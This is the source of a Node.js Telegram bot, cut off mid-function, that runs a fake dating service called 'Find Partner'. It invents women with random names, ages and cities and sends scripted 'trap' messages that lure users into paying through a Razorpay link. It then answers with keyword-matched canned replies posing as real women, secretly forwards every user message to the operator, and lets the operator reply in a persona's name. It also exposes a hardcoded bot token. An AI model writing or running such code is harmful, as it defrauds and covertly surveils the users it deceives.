const TelegramBot = require('node-telegram-bot-api');
const express = require('express');

const token = '9233588941:AAExCKc9KZjK-UDspUNwIWRUCAEdxV7GnYU';
const ADMIN_ID = '8516187208'; 
const PAYMENT_LINK = 'https://razorpay.me/@VRConnect?amount=CVDUr6Uxp2FOGZGwAHntNg%3D%3D'; 

const app = express();
app.get('/', (req, res) => res.send('Bot is Live!'));
const port = process.env.PORT || 3000;
app.listen(port, '0.0.0.0', () => console.log(`Web server running on port ${port}...`));

const bot = new TelegramBot(token, { polling: true });
bot.on("polling_error", (console.log));
bot.on("error", (console.log));

const users = {}; 
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const getGreeting = () => ["hie", "hii", "hello", "hiiii", "hyy"][Math.floor(Math.random() * 5)];
const getLocation = () => ["delhi", "mumbai", "jaipur", "pune", "bangalore", "indore", "chandigarh", "bhopal", "ahmedabad"][Math.floor(Math.random() * 9)];
const getAge = () => Math.floor(Math.random() * (35 - 19 + 1)) + 19;
const getTrapName = () => ["Pooja", "Neha", "Simran", "Shweta", "Kavya", "Riya", "Anjali", "Sneha"][Math.floor(Math.random() * 8)];
const getVipName = () => ["Pooja", "Neha", "Simran", "Shweta", "Kavya", "Riya", "Anjali", "Sneha", "Varsha Chouhan"][Math.floor(Math.random() * 9)];

// ==========================================
// 1. WARNING & WELCOME SCREEN
// ==========================================
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (users[chatId] && users[chatId].state === 'SUSPENDED') return;

    const warningText = "⚠️ <b>ATTENTION!</b>\n\n<i>Please Talk Respectfully To everyone otherwise we Will block Your Account & Your Age must be 18+</i>";
    const options = {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [[{ text: "✅ I Agree (18+)", callback_data: "agree_terms" }]] }
    };
    bot.sendMessage(chatId, warningText, options);
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    if (users[chatId] && users[chatId].state === 'SUSPENDED') {
        bot.answerCallbackQuery(query.id);
        return;
    }
    
    if (query.data === 'agree_terms') {
        bot.deleteMessage(chatId, query.message.message_id).catch(() => {}); 
        if (!users[chatId]) {
            users[chatId] = { state: 'NEW', isVip: false, vipExpiry: null, msgCount: 0, nudges: [], richaTimeout: null, trapName: getTrapName(), vipName: "", abuseCount: 0, unknownCount: 0 };
        }
        
        const welcomeText = "💖 ✨ <b>WELCOME TO FIND PARTNER</b> ✨ 💖\n\n<i>Nayi chat shuru karne ke liye niche click karein 👇</i>";
        const options = {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "💞 Find GF 💘", callback_data: "find_gf" }]] }
        };
        bot.sendMessage(chatId, welcomeText, options);
        bot.answerCallbackQuery(query.id);
        return;
    }

    const user = users[chatId];
    if (!user) return;

    if (query.data === 'find_gf') {
        if (user.isVip && user.vipExpiry < Date.now()) {
            user.isVip = false;
            user.state = 'AWAITING_PAYMENT';
        }
        
        if (user.state === 'CHATTING_1' || user.state === 'CHATTING_2' || user.state === 'RICHA_CHAT') {
            bot.answerCallbackQuery(query.id);
            bot.sendMessage(chatId, "<i>Tum pehle se chat mein ho! Upar ladki ke message ka reply karo.</i>", { parse_mode: 'HTML' });
            return;
        }

        bot.answerCallbackQuery(query.id);
        bot.sendMessage(chatId, "<i>Searching GF... ⏳💖</i>", { parse_mode: 'HTML' });
        bot.sendChatAction(chatId, 'typing');
        await sleep(3000); 

        // LURING TRAP (Dynamic messages before paywall lock)
        if (user.state === 'NEW' || user.state === 'AWAITING_PAYMENT' || user.state === 'LURING') {
            user.state = 'LURING';
            if (user.nudges && user.nudges.length > 0) user.nudges.forEach(clearTimeout);
            user.nudges = [];
            
            let msgLimit = Math.floor(Math.random() * 5) + 4; 
            const trapMessages = ['hii', 'kaha se', 'name ??', '??', 'Kya hua', 'bologe kuch', 'are u there', 'busy ho kya'];

            for (let i = 0; i < msgLimit; i++) {
                user.nudges.push(setTimeout(() => { 
                    if (users[chatId] && users[chatId].state === 'LURING') {
                        bot.sendMessage(chatId, `<b>${users[chatId].trapName}:</b> ${trapMessages[i]}`, { parse_mode: 'HTML' });
                    }
                }, i * 5000)); 
            }

            user.nudges.push(setTimeout(() => { 
                if (users[chatId] && users[chatId].state === 'LURING') {
                    bot.sendMessage(chatId, `<i>*${users[chatId].trapName} has left the chat.*</i> 💔`, { parse_mode: 'HTML' });
                    users[chatId].state = 'AWAITING_PAYMENT'; 
                }
            }, msgLimit * 5000 + 2000));
        } 
        else if (user.state === 'CHAT_1_START' && user.isVip) {
            user.state = 'CHATTING_1';
            user.msgCount = 0;
            user.unknownCount = 0;
            let newName = getVipName();
            while(newName === user.vipName) newName = getVipName();
            user.vipName = newName;
            bot.sendMessage(chatId, `<b>${user.vipName}:</b> ${getGreeting()}`, { parse_mode: 'HTML' });
        }
        else if (user.state === 'CHAT_2_START' && user.isVip) {
            user.state = 'CHATTING_2';
            user.msgCount = 0;
            user.unknownCount = 0;
            let newName = getVipName();
            while(newName === user.vipName) newName = getVipName();
            user.vipName = newName;
            bot.sendMessage(chatId, `<b>${user.vipName}:</b> ${getGreeting()}`, { parse_mode: 'HTML' });
        }
        else if (user.state === 'RICHA_HANDOFF' && user.isVip) {
            bot.sendMessage(chatId, "<b>Richa:</b> name", { parse_mode: 'HTML' });
            user.state = 'RICHA_CHAT';
        }
    }
});

// ==========================================
// 2. MAIN CHAT LOGIC (With Stealth Monitoring & Deep Analysis)
// ==========================================
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    
    // 👑 ADMIN MANUAL OVERRIDE (Stealth Reply)
    if (chatId.toString() === ADMIN_ID && msg.reply_to_message) {
        const replyText = msg.reply_to_message.text || msg.reply_to_message.caption;
        if (replyText) {
            const targetUserId = replyText.match(/\[ID: (\d+)\]/)?.[1];
            if (targetUserId && msg.text && users[targetUserId]) {
                let senderName = "Richa"; 
                if (users[targetUserId].state === 'CHATTING_1' || users[targetUserId].state === 'CHATTING_2') {
                    senderName = users[targetUserId].vipName;
                }
                
                bot.sendMessage(targetUserId, `<b>${senderName}:</b> ${msg.text}`, { parse_mode: 'HTML' });
                
                if (users[targetUserId].richaTimeout) {
                    clearTimeout(users[targetUserId].richaTimeout);
                    users[targetUserId].richaTimeout = null;
                }
            }
        }
        return;
    }

    const user = users[chatId];
    if (!user || user.state === 'SUSPENDED') return;

    if (user.state !== 'LURING' && user.nudges && user.nudges.length > 0) {
        user.nudges.forEach(clearTimeout);
        user.nudges = [];
    }

    // PAYMENT SCREENSHOT LISTENER & PAYWALL
    if (user.state === 'AWAITING_PAYMENT' || user.state === 'LURING') {
        if (msg.photo || msg.document) {
            bot.sendMessage(ADMIN_ID, `🧾 <b>Payment Proof Received</b> from User [ID: ${chatId}]\nCheck the screenshot and use <code>/approve ${chatId}</code> to activate VIP.`, {parse_mode: 'HTML'});
            bot.forwardMessage(ADMIN_ID, chatId, msg.message_id);
            bot.sendMessage(chatId, "<i>✅ Screenshot received! Admin is verifying your payment. Please wait for approval... ⏳</i>", {parse_mode: 'HTML'});
        } else if (msg.text && !msg.text.startsWith('/')) {
            sendPaywall(chatId); 
        }
        return;
    }

    const text = msg.text;
    if (!text || text.startsWith('/')) return;

    // VIP AI CHAT LOGIC
    if (user.state === 'CHATTING_1' || user.state === 'CHATTING_2') {
        let textLower = text.toLowerCase();
        let displayName = user.vipName;
        
        // 👀 STEALTH MONITORING: Har message seedha Admin ko jayega
        bot.sendMessage(ADMIN_ID, `👀 <b>[ID: ${chatId}]</b> to ${displayName}:\n${text}`, { parse_mode: 'HTML' });
        
        // --- 2 STRIKE ABUSE SYSTEM ---
        if (textLower.match(/\b(ai|chut|sex|chudegi|horny|boobs|dudh|size)\b/)) {
            user.abuseCount = (user.abuseCount || 0) + 1;
            if (user.abuseCount >= 2) {
                user.state = 'SUSPENDED';
                bot.sendMessage(chatId, "🚫 <b>Your Account has been Suspended for violating our policies.</b>", { parse_mode: 'HTML' });
            } else {
                bot.sendMessage(chatId, "⚠️ <b>Last warning Otherwise we will block Your Account Talk Respectfully 🌹</b>", { parse_mode: 'HTML' });
            }
            return; 
        }

        user.msgCount += 1;
        bot.sendChatAction(chatId, 'typing');
        await sleep(1500); 

        const leaveChat = async (nextState) => {
            if (displayName === "Varsha Chouhan") {
                bot.sendMessage(chatId, `<b>Varsha Chouhan:</b> meri insta id lelo varsha_chouhan7268 yaha msg krna 😘`, { parse_mode: 'HTML' });
                await sleep(1500);
            }
            bot.sendMessage(chatId, `<i>*${displayName} has left the chat.*</i> 💔\n\nDusri GF find karne ke liye wapas 'Find GF' dabayein.`, { parse_mode: 'HTML' });
            user.state = nextState;
            sendFindGfButton(chatId);
        };

        // CHAT LIMIT EXHAUSTION (Set to 25)
        if (user.msgCount >= 25) {
            await leaveChat(user.state === 'CHATTING_1' ? 'CHAT_2_START' : 'RICHA_HANDOFF'); 
            return;
        }

        let reply = "";
        let matched = true; 

        // --- SMART DEEP ANALYSIS CHAT LOGIC ---
        
        // Photo / Pic / Meet request
        if (textLower.match(/(see u|see you|pic|photo|image|meet|milna|dekhna|dekhu|dekh skta|dekh sakti|mil)/)) {
            reply = [
                "nahi", "sorry", "I can't", "abhi to janti bhi nahi", "nahi pehle baat kro", 
                "sorry baat kro pehle", "nahi de skti", "ni yr", "aap bhej do apna m ni de skti", "random har kisi ko konn dega yrr"
            ][Math.floor(Math.random() * 10)];
        }
        else if (textLower.match(/(insta|\big\b|instagram|number|whatsapp|call|vc|video call|phone|mobile)/)) {
            reply = ["naa", "nahi", "sorry", "abhi ni", "baad me"][Math.floor(Math.random()*5)];
        }
        else if (textLower.match(/(height|haight|lambai|lambi|tall)/)) {
            reply = ["5'1\"", "5'2\"", "5'3\"", "5'4\"", "5'5\"", "5'6\""][Math.floor(Math.random()*6)];
        }
        // Family Details
        else if (textLower.match(/(ghr|ghar|family|parivar|kaun kaun|kon kon)/)) {
            const sibling = ["chhota bhai", "bda bhai", "chhoti behn", "bdi behn"][Math.floor(Math.random()*4)];
            reply = `mummy papa or ek ${sibling} h, aur aapke?`;
        }
        // Current Activity (Kya kar rahi ho abhi)
        else if (textLower.match(/(abhi kya|kya kr rhi|kya kar rahi|kkrh|kkrho|kuch kr|free ho)/)) {
            reply = ["kpde dhoye h", "kuch ni", "nothing", "free hu"][Math.floor(Math.random()*4)];
        }
        // Profession/Study (Kya karti ho)
        else if (textLower.match(/(study|padhai|kya krti|kya karte|kaam kya|profession|job|kaam krti)/)) {
            const studies = ["BSc", "B.Ed", "BA", "BCom", "MCom"];
            const study = studies[Math.floor(Math.random() * studies.length)];
            reply = [`study krri hu ${study}`, "silai krti hu", "pdhai puri krli h"][Math.floor(Math.random()*3)];
        }
        // Relationship Proposal
        else if (textLower.match(/(gf|girlfriend|friend|frnd|relation|relationship|dost|set|setting)/)) {
            reply = ["time do thoda", "dekhte h", "kya krte ho", "sochungi", "nahi"][Math.floor(Math.random()*5)];
        }
        // Past BF / Ex
        else if (textLower.match(/(bf|boyfriend|boy friend|ex |kabhi bf|past relation)/)) {
            reply = ["haa tha brkup hogya chhoro", "ex tha or btao", "ha tha aage ki baat krte h", "nahi", "ni"][Math.floor(Math.random()*5)];
        }
        else if (textLower.match(/\b(hi|hello|hie|hy|hlo|helo|hey)\b/)) {
            reply = ["hmm", "kaha se ho aap?", "age kya hai tumhari?", "aur btao", "hmm, aap batao"][Math.floor(Math.random()*5)];
        }
        else if (textLower.match(/\b(naam|name)\b/)) {
            reply = displayName;
        }
        else if (textLower.match(/\b(single)\b/)) {
            reply = ["haa", "hmm", "ji", "haan"][Math.floor(Math.random()*4)];
        }
        else if (textLower.match(/\b(married|shadi|shaadi)\b/)) {
            reply = ["haa", "yes", "hm", "nahi", "no"][Math.floor(Math.random()*5)];
        }
        else if (textLower.match(/\b(bachhe|bache|kids|child|bacche|bachey)\b/)) {
            reply = "ni h";
        }
        else if (textLower.match(/\b(kese|kesi|hru|how are|kya hal|kya haal)\b/)) {
            reply = ["bdhiya", "good", "mst", "achi", "fine"][Math.floor(Math.random()*5)];
        }
        // Where are you from + CROSS QUESTION
        else if (textLower.match(/\b(kaha|from|where|jagah|city)\b/)) {
            const askBack = ["aap kaha se?", "you?", "u?", "Aap?", "Tum?"][Math.floor(Math.random()*5)];
            reply = `${getLocation()}, aur ${askBack}`;
        }
        else if (textLower.match(/\b(age|saal|umar|old)\b/)) {
            reply = getAge().toString();
        }
        // AJEEB SAWAL / UNMATCHED TEXT LOGIC (4 Strikes)
        else {
            matched = false;
            user.unknownCount = (user.unknownCount || 0) + 1;
            
            if (user.unknownCount >= 4) {
                await leaveChat(user.state === 'CHATTING_1' ? 'CHAT_2_START' : 'RICHA_HANDOFF'); 
                return;
            }
            
            reply = [
                "hmm", "acha", "sahi h", "ohh", "nice", "ok", "hm", 
                "acha, wese aapki age kya h?", "hmm, aap study krte ho ya job?", "ok, ghr me kon kon h aapke?"
            ][Math.floor(Math.random()*10)];
        }

        // Reset unknown counter if a valid question was matched
        if (matched) user.unknownCount = 0
        
